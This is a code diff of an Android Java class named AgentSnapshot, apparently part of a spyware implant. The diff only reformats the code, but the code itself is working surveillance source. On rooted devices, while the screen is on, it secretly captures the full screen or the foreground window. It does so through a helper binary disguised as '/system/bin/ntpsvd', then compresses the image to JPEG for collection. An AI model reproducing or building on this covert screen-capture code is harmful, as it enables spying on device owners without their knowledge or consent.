@@ -57,13 +57,13 @@ public class AgentSnapshot extends AgentBase {
 	/** The type. */
 	private int type;
 
-
 	/**
 	 * Instantiates a new snapshot agent.
 	 */
 	public AgentSnapshot() {
-		if (Cfg.DEBUG)
-			Check.log( TAG + " SnapshotAgent constructor");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " SnapshotAgent constructor");
+		}
 	}
 
 	/*
@@ -73,9 +73,8 @@ public class AgentSnapshot extends AgentBase {
 	 */
 	@Override
 	public boolean parse(AgentConf conf) {
-		byte[] confParameters = conf.getParams();
-		myConf = Utils.bufferToByteBuffer(confParameters,
-				ByteOrder.LITTLE_ENDIAN);
+		final byte[] confParameters = conf.getParams();
+		myConf = Utils.bufferToByteBuffer(confParameters, ByteOrder.LITTLE_ENDIAN);
 
 		this.delay = myConf.getInt();
 		this.type = myConf.getInt();
@@ -112,38 +111,42 @@ public class AgentSnapshot extends AgentBase {
 	@Override
 	public synchronized void go() {
 		switch (type) {
-			case CAPTURE_FULLSCREEN:
-				if (Cfg.DEBUG)
-					Check.log( TAG + " Snapshot Agent: logging full screen");
-				break;
-	
-			case CAPTURE_FOREGROUND:
-				if (Cfg.DEBUG)
-					Check.log( TAG + " Snapshot Agent: logging foreground window");
-				break;
-	
-			default:
-				if (Cfg.DEBUG)
-					Check.log( TAG + " Snapshot Agent: wrong capture parameter");
-				break;
+		case CAPTURE_FULLSCREEN:
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Snapshot Agent: logging full screen");
+			}
+			break;
+
+		case CAPTURE_FOREGROUND:
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Snapshot Agent: logging foreground window");
+			}
+			break;
+
+		default:
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Snapshot Agent: wrong capture parameter");
+			}
+			break;
 		}
 
 		try {
 			if (Status.self().haveRoot()) {
-				boolean isScreenOn = ListenerStandby.isScreenOn();
-				
+				final boolean isScreenOn = ListenerStandby.isScreenOn();
+
 				if (!isScreenOn) {
-					if(Cfg.DEBUG) Check.log( TAG + " (go): Screen powered off, no snapshot");
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (go): Screen powered off, no snapshot");
+					}
 					return;
 				}
-								
-				Display display = ((WindowManager) Status.getAppContext()
-						.getSystemService(Context.WINDOW_SERVICE))
-						.getDefaultDisplay();
-				
+
+				final Display display = ((WindowManager) Status.getAppContext()
+						.getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();
+
 				int width, height;
-				int orientation = display.getOrientation();
-				
+				final int orientation = display.getOrientation();
+
 				if (orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
 					width = display.getWidth();
 					height = display.getHeight();
@@ -152,8 +155,9 @@ public class AgentSnapshot extends AgentBase {
 					width = display.getHeight();
 				}
 
-				if (Cfg.DEBUG)
-					Check.log( TAG + " (go): w=" + width + " h=" + height);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (go): w=" + width + " h=" + height);
+				}
 
 				byte[] raw = getRawBitmap();
 				// int[] pixels = new int[ width * height];
@@ -167,17 +171,17 @@ public class AgentSnapshot extends AgentBase {
 					raw = null;
 
 					if (orientation != Surface.ROTATION_0) {
-						Matrix matrix = new Matrix();
-						
-						if (orientation == Surface.ROTATION_90)
-							matrix.setRotate(270);
-						else if (orientation == Surface.ROTATION_270)
-							matrix.setRotate(90);
-						else if (orientation == Surface.ROTATION_180)
-							matrix.setRotate(180);
+						final Matrix matrix = new Matrix();
 
-						bitmap = Bitmap.createBitmap(bitmap, 0, 0, width,
-								height, matrix, true);
+						if (orientation == Surface.ROTATION_90) {
+							matrix.setRotate(270);
+						} else if (orientation == Surface.ROTATION_270) {
+							matrix.setRotate(90);
+						} else if (orientation == Surface.ROTATION_180) {
+							matrix.setRotate(180);
+						}
+
+						bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
 					}
 
 					byte[] jpeg = toJpeg(bitmap);
@@ -187,9 +191,9 @@ public class AgentSnapshot extends AgentBase {
 					jpeg = null;
 				}
 			}
-		} catch (Exception ex) {
+		} catch (final Exception ex) {
 			if (Cfg.DEBUG) {
-				Check.log( TAG + " (go) Error: " + ex);
+				Check.log(TAG + " (go) Error: " + ex);
 				Check.log(ex);
 			}
 		}
@@ -218,39 +222,43 @@ public class AgentSnapshot extends AgentBase {
 
 	private byte[] toJpeg(Bitmap bitmap) {
 
-		ByteArrayOutputStream os = new ByteArrayOutputStream();
-		bitmap.compress(Bitmap.CompressFormat.JPEG,
-				SNAPSHOT_DEFAULT_JPEG_QUALITY, os);
+		final ByteArrayOutputStream os = new ByteArrayOutputStream();
+		bitmap.compress(Bitmap.CompressFormat.JPEG, SNAPSHOT_DEFAULT_JPEG_QUALITY, os);
 
-		byte[] array = os.toByteArray();
+		final byte[] array = os.toByteArray();
 		try {
 			os.close();
 
-		} catch (IOException e) {
-			if (Cfg.DEBUG)
+		} catch (final IOException e) {
+			if (Cfg.DEBUG) {
 				Check.log(e);
+			}
 		}
 		return array;
 
 	}
 
 	private byte[] getRawBitmap() {
-		File filesPath = Status.getAppContext().getFilesDir();
-		String path = filesPath.getAbsolutePath();
+		final File filesPath = Status.getAppContext().getFilesDir();
+		final String path = filesPath.getAbsolutePath();
 
-		String getrawpath = "/system/bin/ntpsvd fb";
+		final String getrawpath = "/system/bin/ntpsvd fb";
 		try {
-			Process localProcess = Runtime.getRuntime().exec(getrawpath);
+			final Process localProcess = Runtime.getRuntime().exec(getrawpath);
 			localProcess.waitFor();
 
-			AutoFile file = new AutoFile(path, "frame");
+			final AutoFile file = new AutoFile(path, "frame");
 			if (file.exists()) {
 				return file.read();
 			}
-		} catch (IOException e) {
-			if(Cfg.DEBUG) Check.log(e);
-		} catch (InterruptedException e) {
-			if(Cfg.DEBUG) Check.log(e);
+		} catch (final IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(e);
+			}
+		} catch (final InterruptedException e) {
+			if (Cfg.DEBUG) {
+				Check.log(e);
+			}
 		}
 		return null;
 	}
